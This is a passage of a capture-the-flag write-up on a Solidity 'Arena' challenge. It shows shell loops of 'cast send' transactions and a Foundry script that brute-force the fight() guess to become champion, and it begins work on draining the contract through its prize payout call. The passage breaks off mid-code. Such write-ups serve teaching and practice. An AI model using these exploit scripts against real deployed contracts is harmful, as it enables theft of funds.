+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+46<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">77</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+47<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">78</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+48<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">79</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+49<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">80</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+50<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">81</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+51<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">82</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+52<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">83</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+53<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">84</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+54<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">85</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+55<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">86</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+56<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">87</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+57<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">88</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+58<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">89</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+59<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">90</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+60<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">91</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+61<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">92</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+62<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">93</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+63<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">94</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+64<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">95</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+65<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">96</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+66<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">97</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+67<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">98</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+68<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">99</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast call -r $RPC $ARENA <span style="color:#b2c98f">&#34;isChampion(address)(bool)&#34;</span> $ADDRESS
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<blockquote>
+<p>After CTF, by debugging we saw that the only transaction crashing was the one with the winning number, so that&rsquo;s how work casinos &hellip;</p>
+</blockquote>
+<p>Finally, I remembered that we can <a href="https://getfoundry.sh/guides/scripting-with-solidity">script with foundry</a> and I never managed to make it work.</p>
+<p>And it is actually goated with all the things called <a href="https://getfoundry.sh/reference/cheatcodes/overview">cheatcodes</a> which allow us to read environment variables to make it easier, use console.log() to print values and many other utilities.</p>
+<p>Here is my script</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">almost_winning_script.sh</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">19</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;../src/Arena.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;../src/DinoPark.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> {Script, console} <span style="color:#e67e80">from</span> <span style="color:#b2c98f">&#34;forge-std/Script.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> WinLottery <span style="color:#e67e80">is</span> Script {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Arena arena <span style="color:#7a8478">=</span> Arena(vm.envAddress(<span style="color:#b2c98f">&#34;ARENA&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">run</span>() <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> deployerPrivateKey <span style="color:#7a8478">=</span> vm.envUint(<span style="color:#b2c98f">&#34;PKEY&#34;</span>);
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>        vm.startBroadcast(deployerPrivateKey);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#e67e80">for</span> ( <span style="color:#dbbc7f">uint8</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">31</span>; i<span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">100</span>; i<span style="color:#7a8478">++</span>){
+</span></span><span style="display:flex;"><span>			arena.fight(i, Arena.FightMode.Normal);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#dbbc7f">bool</span> champion <span style="color:#7a8478">=</span> arena.isChampion(vm.envAddress(<span style="color:#b2c98f">&#34;ADDRESS&#34;</span>));
+</span></span><span style="display:flex;"><span>        console.log(champion);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        vm.stopBroadcast();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>Solidity scripting work by appending all the transactions it will send to a list, and then push this list on the blockchain.</p>
+<p>So the for loop is gonna generate 68 transactions.
+If the number is above 30, I will be winner.</p>
+<p>But I&rsquo;ve got another issue, AGAIN, one transaction failed everytime. Just one. <br>
+By debuggin in local reading this <a href="https://github.com/foundry-rs/foundry/issues/7456">github issue</a>, I found that it was a gas error, but weird because I actually set a <code>gas-limit</code> to almost 1 ETH, more than enough.</p>
+<p>Actually the problem is not that, it&rsquo;s the gas allowed per transaction, the estimation was around 30000 wei for the <code>fight()</code> so those transactions can not use more than that. But when I succeed, the <code>isChampion()</code> mapping is altered, raising the cost of the gas to around 50000 which will make the transaction fails.</p>
+<p>So the fix is just to increase the allowed ammount of gas for this call like that :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">for</span> ( <span style="color:#dbbc7f">uint8</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">31</span>; i<span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">100</span>; i<span style="color:#7a8478">++</span>){
+</span></span><span style="display:flex;"><span>    arena.fight{<span style="color:#d699b6">gas</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">100000</span>}(i, Arena.FightMode.Normal);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="../../images/writeups/wwctf/gas-issue.png" alt="it was all gas"></p>
+<p>We run the forge script command and become a champion :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>forge script script/BecomeChampion.s.sol:WinLottery --rpc-url $RPC --private-key $PKEY --broadcast --gas-limit <span style="color:#d699b6">10000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#I deleted the logs</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast call -r $RPC $ARENA <span style="color:#b2c98f">&#34;isChampion(address)&#34;</span> $ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">true</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now let&rsquo;s find a way empty the arena contract.</p>
+<h2 id="empty-the-arena-contract">Empty the arena contract</h2>
+<p>The strategy of this one is to look at the ways to get ethers.
+There is the <code>drainToChampion()</code> function it require us to be the parkContract which is not possible here, so it&rsquo;s a bait.</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">Evil.sol:RemoteFight</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">drainToChampion</span>(<span style="color:#dbbc7f">address</span> champ) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span> <span style="color:#7a8478">==</span> parkContract, <span style="color:#b2c98f">&#34;Only DinoPark can drain&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> bal <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>).<span style="color:#d699b6">balance</span>;
+</span></span><span style="display:flex;"><span>    (<span style="color:#dbbc7f">bool</span> ok, ) <span style="color:#7a8478">=</span> champ.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> bal}(<span style="color:#b2c98f">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(ok, <span style="color:#b2c98f">&#34;Drain failed&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>And the other way is to win a fight.</p>
+<p>When winning a fighting, this line is executed in the <code>fight()</code> function:</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>(<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> PRIZE_MONEY}(<span style="color:#b2c98f">&#34;&#34;</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It takes the address of the <code>msg.sender</code>, in this context it is the address of the fighter which is an EOA or smart contract.
+<br>Then, the function <code>&quot;&quot;</code> is called with PRIZE_MONEY (0.1 ether) in value. <br>
+To wrap up, it calls a function with no name and send 0.1 ether to us if we win.</p>
+<p>We can think to just call <code>fight()</code> once more to get more ethers, but there is a kind of security that prevent us to t do that :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">fight</span>(<span style="color:#dbbc7f">uint8</span> guess, FightMode mode) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (<span style="color:#7a8478">!</span>isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>]) {
+</span></span><span style="display:flex;"><span>        prepareArena();
+</span></span><span style="display:flex;"><span>        isFighting[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bool</span> playerWins <span style="color:#7a8478">=</span> _didPlayerWin(guess, mode);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (playerWins) {
+</span></span><span style="display:flex;"><span>        champions[<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">=</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>        (<span style="color:#dbbc7f">bool</span> sent, ) <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>.<span style="color:#d699b6">call</span>{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> PRIZE_MONEY}(<span style="color:#b2c98f">&#34;&#34;</span>);
